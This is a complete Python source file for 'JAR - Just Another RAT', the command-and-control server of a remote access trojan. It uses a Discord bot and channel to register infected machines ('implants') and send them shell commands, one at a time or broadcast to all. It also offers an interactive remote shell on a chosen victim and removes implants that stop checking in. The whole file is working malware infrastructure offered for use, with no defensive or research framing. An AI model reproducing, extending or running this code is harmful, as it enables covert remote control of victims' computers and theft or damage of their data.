import discord
from discord.ext import commands, tasks
from discord import app_commands # For slash commands
import asyncio
import os
import colorama
import time
from dotenv import load_dotenv
import uuid 

# --- Global Variables ---
active_implants = {}  
implant_outputs = {} 
implant_output_events = {} 
implants_lock = asyncio.Lock() 

IN_LOCK_MODE = False
LOCKED_IMPLANT_ID = None
C2_CHANNEL_ID = None 
BOT_TOKEN = None 
MY_GUILD_ID = None # Optional: For faster slash command syncing to one server

# --- Bot Setup ---
intents = discord.Intents.default()
intents.messages = True
intents.message_content = True # Ensure this is enabled in your bot's settings on Discord Developer Portal

bot = commands.Bot(command_prefix="jar!", intents=intents) 

def logo():
    print(colorama.Fore.CYAN + """
     ██╗ █████╗ ██████╗ 
     ██║██╔══██╗██╔══██╗
     ██║███████║██████╔╝
 ██  ██║██╔══██║██╔══██╗
╚█████╔╝██║  ██║██║  ██║
 ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
    """ + colorama.Fore.RESET)
    print(colorama.Fore.YELLOW + "JAR - Just Another RAT" + colorama.Fore.RESET)
    print(colorama.Fore.YELLOW + "By: Dylouwu" + colorama.Fore.RESET)
    print(colorama.Fore.YELLOW + "Version: 1.0.0" + colorama.Fore.RESET) # Version updated

@bot.event
async def on_ready():
    os.system("cls" if os.name == "nt" else "clear")
    logo()
    print(f"[+] JAR C2 Bot '{bot.user.name}' (ID: {bot.user.id}) is online.")
    if C2_CHANNEL_ID:
        c2_channel_obj = bot.get_channel(C2_CHANNEL_ID)
        if c2_channel_obj:
            print(f"[+] Listening for implant output in channel: #{c2_channel_obj.name} (ID: {C2_CHANNEL_ID})")
        else:
            print(f"{colorama.Fore.RED}[!] C2 Channel ID {C2_CHANNEL_ID} not found or bot has no access.{colorama.Fore.RESET}")
            print(f"{colorama.Fore.YELLOW}[!] Please ensure the bot is in the server and has permissions for this channel.{colorama.Fore.RESET}")

    else:
        print(f"{colorama.Fore.RED}[!] C2_CHANNEL_ID not configured! Cannot receive implant output.{colorama.Fore.RESET}")
    
    try:
        if MY_GUILD_ID:
            guild_obj = discord.Object(id=MY_GUILD_ID)
            bot.tree.copy_global_to(guild=guild_obj) 
            await bot.tree.sync(guild=guild_obj)
            print(f"[+] Slash commands synced to guild {MY_GUILD_ID}.")
        else:
            await bot.tree.sync()
            print("[+] Slash commands synced globally (may take up to an hour to appear).")
    except Exception as e:
        print(f"{colorama.Fore.RED}[!] Failed to sync slash commands: {e}{colorama.Fore.RESET}")

    print(f"[{colorama.Fore.YELLOW}?{colorama.Fore.RESET}] Use console or Discord slash commands to interact.")
    
    asyncio.create_task(server_console_loop())
    check_stale_implants.start()


@bot.event
async def on_message(message: discord.Message):
    global IN_LOCK_MODE, LOCKED_IMPLANT_ID 
    if message.author == bot.user:
        return
    if message.channel.id != C2_CHANNEL_ID:
        return

    content = message.content
    
    try:
        terminal_width = os.get_terminal_size().columns
    except OSError: 
        terminal_width = 100
    print(f"\r{' ' * terminal_width}\r", end='')


    parts = content.split(":", 2)
    if len(parts) >= 2:
        msg_type = parts[0].upper()
        implant_id = parts[1]
        data = parts[2] if len(parts) > 2 else ""

        async with implants_lock:
            if msg_type == "CHECKIN":
                if implant_id not in active_implants:
                    print(f"{colorama.Fore.GREEN}[+] New implant check-in: {implant_id} ({data}){colorama.Fore.RESET}")
                active_implants[implant_id] = {"last_seen": time.time(), "info": data, "bot_message_id_for_cmd": None}
                if implant_id not in implant_output_events:
                    implant_output_events[implant_id] = asyncio.Event()
            
            elif msg_type == "OUTPUT":
                if implant_id in active_implants:
                    active_implants[implant_id]["last_seen"] = time.time()
                    implant_outputs[implant_id] = data
                    if implant_id in implant_output_events:
                        implant_output_events[implant_id].set() 
                    
                    if not (IN_LOCK_MODE and LOCKED_IMPLANT_ID == implant_id):
                        current_time = time.strftime("%H:%M:%S", time.localtime())
                        print(f"{colorama.Fore.GREEN}[{implant_id} @ {current_time}]{colorama.Fore.RESET}\n{data.strip()}\n")
                else:
                    print(f"{colorama.Fore.YELLOW}[?] Output from unknown/stale implant ID: {implant_id}{colorama.Fore.RESET}")

# --- Slash Command Definitions ---
jar_commands_group = app_commands.Group(name="jar", description="JAR RAT Commands")

@jar_commands_group.command(name="list_implants", description="Lists active implants.")
async def list_implants_slash(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True) 
    async with implants_lock:
        current_implants_list = list(active_implants.items())
    
    if not current_implants_list:
        await interaction.followup.send("No active implants.", ephemeral=True)
        return

    embed = discord.Embed(title="Active Implants", color=discord.Color.blue())
    for idx, (implant_id, data) in enumerate(current_implants_list, start=1):
        last_seen_ago = time.time() - data.get("last_seen", time.time())
        info_str = data.get("info", "N/A")
        embed.add_field(name=f"{idx}. ID: {implant_id[:12]}...", 
                        value=f"Info: {info_str}\nLast seen: {last_seen_ago:.0f}s ago", 
                        inline=False)
    await interaction.followup.send(embed=embed, ephemeral=True)

async def send_command_to_implant_and_wait(interaction_or_none: discord.Interaction | None, implant_id: str, command_text: str):
    c2_channel = bot.get_channel(C2_CHANNEL_ID)
    if not c2_channel:
        if interaction_or_none: await interaction_or_none.followup.send("C2 Channel not found!", ephemeral=True)
        else: print(f"{colorama.Fore.RED}[!] C2 Channel not found!{colorama.Fore.RESET}")
        return

    async with implants_lock:
        if implant_id not in active_implants:
            if interaction_or_none: await interaction_or_none.followup.send(f"Implant ID '{implant_id}' not found or inactive.", ephemeral=True)
            else: print(f"{colorama.Fore.RED}[!] Implant ID '{implant_id}' not found or inactive.{colorama.Fore.RESET}")
            return
        if implant_id not in implant_output_events: implant_output_events[implant_id] = asyncio.Event()
        implant_output_events[implant_id].clear()
        implant_outputs[implant_id] = ""
    
    await c2_channel.send(f"CMD:{implant_id}:{command_text}")
    
    if not interaction_or_none: 
        print(f"{colorama.Fore.BLUE}[*] Waiting for output from {implant_id[:8]}...{colorama.Fore.RESET}", end='\r', flush=True)

    try:
        await asyncio.wait_for(implant_output_events[implant_id].wait(), timeout=30)
        output_data = implant_outputs.get(implant_id, "No output received.")
        
        if interaction_or_none: 
            if len(output_data) > 1950: output_data = output_data[:1950] + "... (truncated)"
            await interaction_or_none.followup.send(f"**Output from `{implant_id[:8]}` for `{command_text}`:**\n```\n{output_data.strip()}\n```", ephemeral=False)
        else: 
            print(" " * 80, end='\r', flush=True) 

    except asyncio.TimeoutError:
        if interaction_or_none: 
            await interaction_or_none.followup.send(f"Timeout waiting for output from `{implant_id[:8]}` for command `{command_text}`.", ephemeral=False)
        else: 
            print(" " * 80, end='\r', flush=True)
            print(f"\n{colorama.Fore.YELLOW}[!] Timeout: No output from {implant_id[:8]}... for '{command_text}'. Implant remains active.{colorama.Fore.RESET}")


@jar_commands_group.command(name="cmd", description="Sends a command to a specific implant.")
@app_commands.describe(target="Implant number (from list) or full Implant ID.", instruction="The command to execute on the implant.")
async def cmd_slash(interaction: discord.Interaction, target: str, instruction: str):
    await interaction.response.defer(ephemeral=False) 
    
    actual_implant_id = None
    async with implants_lock:
        current_implants_ids = list(active_implants.keys())
        if target.isdigit():
            try:
                target_idx = int(target) - 1
                if 0 <= target_idx < len(current_implants_ids):
                    actual_implant_id = current_implants_ids[target_idx]
                else:
                    await interaction.followup.send(f"Invalid implant number: {target}. Use `/jar list_implants`.", ephemeral=True); return
            except ValueError: 
                await interaction.followup.send(f"Invalid target format: {target}. Use number or full ID.", ephemeral=True); return
        else: 
            if target in current_implants_ids:
                actual_implant_id = target
            else:
                await interaction.followup.send(f"Implant ID '{target}' not found. Use `/jar list_implants`.", ephemeral=True); return
    
    if actual_implant_id:
        await send_command_to_implant_and_wait(interaction, actual_implant_id, instruction)

@jar_commands_group.command(name="broadcast", description="Broadcasts a command to all active implants.")
@app_commands.describe(instruction="The command to broadcast.")
async def broadcast_slash(interaction: discord.Interaction, instruction: str):
    await interaction.response.defer(ephemeral=False)
    c2_channel = bot.get_channel(C2_CHANNEL_ID)
    if not c2_channel:
        await interaction.followup.send("C2 Channel not configured/found!", ephemeral=True); return

    sent_to_count = 0
    async with implants_lock:
        if not active_implants:
            await interaction.followup.send("No active implants to broadcast to.", ephemeral=True); return
        for implant_id_bc in list(active_implants.keys()): 
            try: 
                await c2_channel.send(f"CMD:{implant_id_bc}:{instruction}")
                sent_to_count +=1
            except Exception as e_bc: 
                print(f"\n{colorama.Fore.RED}[!] Error broadcasting to {implant_id_bc[:8]}...: {e_bc}{colorama.Fore.RESET}")
    
    await interaction.followup.send(f"Broadcast command '{instruction}' sent to {sent_to_count} implant(s). Check channel for outputs.", ephemeral=False)


async def get_implant_cwd_discord_for_console(implant_id): 
    c2_channel = bot.get_channel(C2_CHANNEL_ID)
    if not c2_channel: return "?"
    
    async with implants_lock:
        if implant_id not in active_implants: return "?"
        if implant_id not in implant_output_events: implant_output_events[implant_id] = asyncio.Event()
        implant_output_events[implant_id].clear()
        implant_outputs[implant_id] = ""

    try:
        await c2_channel.send(f"CMD:{implant_id}:getwd")
        await asyncio.wait_for(implant_output_events[implant_id].wait(), timeout=10)
        response = implant_outputs.get(implant_id, "")
        if response.startswith("[CWD] "):
            return response.replace("[CWD] ", "").strip()
        return "?"
    except asyncio.TimeoutError:
        print(f"{colorama.Fore.YELLOW}[!] Timeout getting CWD for {implant_id} (console mode).{colorama.Fore.RESET}")
        return "?"
    except Exception as e:
        print(f"{colorama.Fore.RED}[!] Error getting CWD for {implant_id} (console mode): {e}{colorama.Fore.RESET}")
        return "?"

async def interactive_shell_console(implant_id_locked): 
    global IN_LOCK_MODE, LOCKED_IMPLANT_ID
    IN_LOCK_MODE = True
    LOCKED_IMPLANT_ID = implant_id_locked
    
    c2_channel = bot.get_channel(C2_CHANNEL_ID)
    if not c2_channel:
        print(f"{colorama.Fore.RED}[!] C2 Channel not found! Cannot start interactive shell.{colorama.Fore.RESET}")
        IN_LOCK_MODE = False; LOCKED_IMPLANT_ID = None; return

    current_remote_cwd = await get_implant_cwd_discord_for_console(implant_id_locked)
    print(f"\n{colorama.Fore.MAGENTA}[*] Interactive shell with implant {implant_id_locked[:12]}... (Type 'exitlock' or Ctrl+C/D to return){colorama.Fore.RESET}")

    loop = asyncio.get_event_loop()
    while IN_LOCK_MODE and LOCKED_IMPLANT_ID == implant_id_locked:
        async with implants_lock:
            if implant_id_locked not in active_implants:
                print(f"\n{colorama.Fore.RED}[!] Implant {implant_id_locked[:12]}... disconnected. Exiting lock mode.{colorama.Fore.RESET}")
                break
        
        prompt_text = f"{colorama.Fore.GREEN}{implant_id_locked[:8]}{colorama.Fore.YELLOW}:{current_remote_cwd}{colorama.Fore.MAGENTA} # {colorama.Fore.RESET}"
        try:
            command = await loop.run_in_executor(None, lambda: input(prompt_text))
        except (KeyboardInterrupt, EOFError):
            print("\nExiting interactive mode...")
            break 

        if command.strip().lower() == "exitlock":
            break
        if not command.strip():
            continue

        try:
            async with implants_lock:
                if implant_id_locked not in active_implants: break 
                if implant_id_locked not in implant_output_events: implant_output_events[implant_id_locked] = asyncio.Event()
                implant_output_events[implant_id_locked].clear()
                implant_outputs[implant_id_locked] = ""

            await c2_channel.send(f"CMD:{implant_id_locked}:{command}")

            try:
                await asyncio.wait_for(implant_output_events[implant_id_locked].wait(), timeout=30) 
                response = implant_outputs.get(implant_id_locked, "")
                print(f"\r{' ' * (len(prompt_text) + 5)}\r", end='') 
                print(response.strip())

                if response.startswith("[CWD] "):
                    current_remote_cwd = response.replace("[CWD] ", "").strip()
                elif command.strip().lower().startswith("cd ") and "[Error]" in response : 
                    current_remote_cwd = await get_implant_cwd_discord_for_console(implant_id_locked)
            except asyncio.TimeoutError:
                print(f"{colorama.Fore.YELLOW}[!] Timeout waiting for output from {implant_id_locked}.{colorama.Fore.RESET}")
                if command.strip().lower().startswith("cd "):
                     current_remote_cwd = await get_implant_cwd_discord_for_console(implant_id_locked)
        
        except discord.errors.HTTPException as e_discord:
            print(f"\n{colorama.Fore.RED}[!] Discord API Error: {e_discord}. Exiting lock mode.{colorama.Fore.RESET}")
            break
        except Exception as e_shell:
            print(f"\n{colorama.Fore.RED}[!] Error in interactive shell: {e_shell}{colorama.Fore.RESET}")

    IN_LOCK_MODE = False
    LOCKED_IMPLANT_ID = None
    print(f"{colorama.Fore.MAGENTA}[*] Exited interactive shell for {implant_id_locked[:12]}...{colorama.Fore.RESET}")

# Definition of display_menu_and_clients (ensure it's defined before server_console_loop)
def display_menu_and_clients(current_clients_list_items): # Parameter name changed for clarity
    print(f"\n{colorama.Fore.YELLOW}[Available Operations]{colorama.Fore.RESET}")
    print(f"  Enter implant number (1-{len(current_clients_list_items)}) for a single command.")
    print(f"  Enter implant number + 'i' (e.g., '1i') for interactive shell.")
    print(f"  '0' to broadcast command.")
    print(f"  'list', 'refresh', 'help', '?' to display this menu and implant list.")
    print(f"  'clear' to clear the screen (then displays menu).")
    print(f"  'exit' or 'quit' to shutdown server.")
    
    if not current_clients_list_items:
        print(f"[{colorama.Fore.YELLOW}?{colorama.Fore.RESET}] No active implants.\n") # Message updated
    else:
        print(f"{colorama.Fore.YELLOW}[Active Implants: {len(current_clients_list_items)}]{colorama.Fore.RESET}") # Message updated
        for idx, (implant_id, data) in enumerate(current_clients_list_items, start=1): # Iterating over items
            last_seen_ago = time.time() - data.get("last_seen", time.time())
            info_str = data.get("info", "N/A")
            print(f"  {idx}. ID: {implant_id[:12]}... ({info_str}) (Last seen: {last_seen_ago:.0f}s ago)")


async def server_console_loop():
    global IN_LOCK_MODE, LOCKED_IMPLANT_ID
    show_menu_next_iteration = True
    loop = asyncio.get_event_loop()

    while True:
        if IN_LOCK_MODE:
            await asyncio.sleep(0.2) 
            async with implants_lock:
                if LOCKED_IMPLANT_ID and LOCKED_IMPLANT_ID not in active_implants:
                    IN_LOCK_MODE = False
                    LOCKED_IMPLANT_ID = None
                    show_menu_next_iteration = True 
            continue
        
        if show_menu_next_iteration:
            async with implants_lock:
                current_implants_list_console = list(active_implants.items()) # Pass items
            display_menu_and_clients(current_implants_list_console) 
            show_menu_next_iteration = False
        
        raw_choice = await loop.run_in_executor(None, lambda: input(f"\n{colorama.Fore.CYAN}JAR > {colorama.Fore.RESET}").strip())
        
        c2_channel = bot.get_channel(C2_CHANNEL_ID)

        async with implants_lock: 
            current_implant_ids_for_processing = list(active_implants.keys())

        if not current_implant_ids_for_processing and raw_choice.lower() not in ['exit', 'quit', 'clear', 'refresh', 'list', 'help', '?', '']:
            if raw_choice: 
                print(f"[{colorama.Fore.YELLOW}?{colorama.Fore.RESET}] No active implants to command.")
            continue 
            
        if not raw_choice: 
            continue

        if raw_choice.lower() == 'clear':
            os.system("cls" if os.name == "nt" else "clear")
            logo()
            print(f"[+] JAR C2 Bot '{bot.user.name}' is online.") 
            show_menu_next_iteration = True
            continue

        if raw_choice.lower() in ['exit', 'quit']:
            print(f"{colorama.Fore.YELLOW}[*] Shutting down bot...{colorama.Fore.RESET}")
            if c2_channel:
                async with implants_lock:
                    for implant_id_to_shutdown in list(active_implants.keys()):
                        try:
                            await c2_channel.send(f"CMD:{implant_id_to_shutdown}:exit")
                        except Exception as e_send:
                            print(f"Error sending exit to {implant_id_to_shutdown}: {e_send}")
            await bot.close()
            if check_stale_implants.is_running():
                check_stale_implants.cancel()
            break 

        if raw_choice.lower() in ['list', 'refresh', 'help', '?']:
            show_menu_next_iteration = True
            continue

        target_implant_id_selected = None
        is_broadcast = False
        is_interactive = False
        
        try:
            if raw_choice == '0':
                if not current_implant_ids_for_processing:
                    print(f"{colorama.Fore.RED}[!] No implants to broadcast to.{colorama.Fore.RESET}"); await asyncio.sleep(0.5); continue
                is_broadcast = True
            elif raw_choice[-1].lower() == 'i' and len(raw_choice) > 1:
                client_num_str = raw_choice[:-1]
                if not client_num_str.isdigit(): raise ValueError("Implant number for interactive mode must be numeric.")
                client_num = int(client_num_str)
                if 1 <= client_num <= len(current_implant_ids_for_processing):
                    target_implant_id_selected = current_implant_ids_for_processing[client_num - 1]
                    is_interactive = True
                else:
                    print(f"{colorama.Fore.RED}[!] Invalid implant number for interactive mode.{colorama.Fore.RESET}"); await asyncio.sleep(0.5); continue
            else:
                if not raw_choice.isdigit(): raise ValueError("Implant selection must be a number.")
                client_num = int(raw_choice)
                if 1 <= client_num <= len(current_implant_ids_for_processing):
                    target_implant_id_selected = current_implant_ids_for_processing[client_num - 1]
                else:
                    print(f"{colorama.Fore.RED}[!] Invalid implant number.{colorama.Fore.RESET}"); await asyncio.sleep(0.5); continue
        except ValueError as e_val:
            print(f"{colorama.Fore.RED}[!] Invalid input: {e_val}{colorama.Fore.RESET}"); await asyncio.sleep(0.5); continue
        except IndexError: 
             print(f"{colorama.Fore.RED}[!] Implant list may have changed. Use 'list' to refresh.{colorama.Fore.RESET}"); show_menu_next_iteration = True; continue

        if is_interactive:
            if target_implant_id_selected:
                await interactive_shell_console(target_implant_id_selected)
                show_menu_next_iteration = True 
            else: 
                print(f"{colorama.Fore.RED}[!] Failed to initiate interactive mode (implant ID error).{colorama.Fore.RESET}")
            continue

        command_to_send_text = ""
        prompt_for_command_text = ""
        if is_broadcast:
            prompt_for_command_text = f"{colorama.Fore.YELLOW}[Broadcast]{colorama.Fore.RESET} Command: "
        elif target_implant_id_selected:
            prompt_for_command_text = f"{colorama.Fore.YELLOW}[{target_implant_id_selected[:8]}...]{colorama.Fore.RESET} Command: "
        
        if prompt_for_command_text:
            command_to_send_text = await loop.run_in_executor(None, lambda: input(prompt_for_command_text))

        if not command_to_send_text.strip():
            print(f"{colorama.Fore.RED}[!] No command entered.{colorama.Fore.RESET}"); await asyncio.sleep(0.5); continue

        if not c2_channel:
            print(f"{colorama.Fore.RED}[!] C2 Channel not available. Cannot send command.{colorama.Fore.RESET}")
            continue

        if is_broadcast:
            print(f"{colorama.Fore.BLUE}[*] Broadcasting '{command_to_send_text}'...{colorama.Fore.RESET}")
            async with implants_lock:
                for implant_id_bc in list(active_implants.keys()): 
                    try: 
                        await c2_channel.send(f"CMD:{implant_id_bc}:{command_to_send_text}")
                    except Exception as e_bc: 
                        print(f"\n{colorama.Fore.RED}[!] Error broadcasting to {implant_id_bc[:8]}...: {e_bc}{colorama.Fore.RESET}")
            await asyncio.sleep(0.1) 
        
        elif target_implant_id_selected: 
            await send_command_to_implant_and_wait(None, target_implant_id_selected, command_to_send_text)

        await asyncio.sleep(0.1)

@tasks.loop(minutes=5.0) 
async def check_stale_implants():
    await bot.wait_until_ready() 
    async with implants_lock:
        stale_threshold = time.time() - 300 
        stale_ids = [implant_id for implant_id, data in active_implants.items() if data.get("last_seen", 0) < stale_threshold]
        for implant_id in stale_ids:
            try:
                terminal_width = os.get_terminal_size().columns
            except OSError:
                terminal_width = 100
            print(f"\r{' ' * terminal_width}\r", end='')
            print(f"{colorama.Fore.YELLOW}[-] Implant {implant_id[:12]}... timed out. Removing from active list.{colorama.Fore.RESET}")
            del active_implants[implant_id]
            if implant_id in implant_outputs: del implant_outputs[implant_id]
            if implant_id in implant_output_events: del implant_output_events[implant_id]

def main():
    global C2_CHANNEL_ID, BOT_TOKEN, MY_GUILD_ID
    colorama.init(autoreset=True)
    load_dotenv()

    BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
    c2_channel_id_str = os.getenv("DISCORD_C2_CHANNEL_ID")
    my_guild_id_str = os.getenv("MY_DISCORD_GUILD_ID") 

    if not BOT_TOKEN:
        print(f"{colorama.Fore.RED}[!] DISCORD_BOT_TOKEN not found in .env or environment. Exiting.{colorama.Fore.RESET}")
        return
    if not c2_channel_id_str:
        print(f"{colorama.Fore.RED}[!] DISCORD_C2_CHANNEL_ID not found in .env or environment. Exiting.{colorama.Fore.RESET}")
        return
    try:
        C2_CHANNEL_ID = int(c2_channel_id_str)
    except ValueError:
        print(f"{colorama.Fore.RED}[!] DISCORD_C2_CHANNEL_ID in .env ('{c2_channel_id_str}') is not a valid number. Exiting.{colorama.Fore.RESET}")
        return
    
    if my_guild_id_str and my_guild_id_str.isdigit():
        MY_GUILD_ID = int(my_guild_id_str)
        
    bot.tree.add_command(jar_commands_group) 

    try:
        bot.run(BOT_TOKEN)
    except discord.errors.LoginFailure:
        print(f"{colorama.Fore.RED}[!] Failed to log in with the provided Discord Bot Token. Check the token.{colorama.Fore.RESET}")
    except discord.errors.PrivilegedIntentsRequired:
        print(f"{colorama.Fore.RED}[!] Privileged Intents (e.g., Message Content) are not enabled for this bot in the Discord Developer Portal.{colorama.Fore.RESET}")
    except Exception as e:
        print(f"{colorama.Fore.RED}[!] Error running Discord bot: {e}{colorama.Fore.RESET}")

if __name__ == "__main__":
    main()

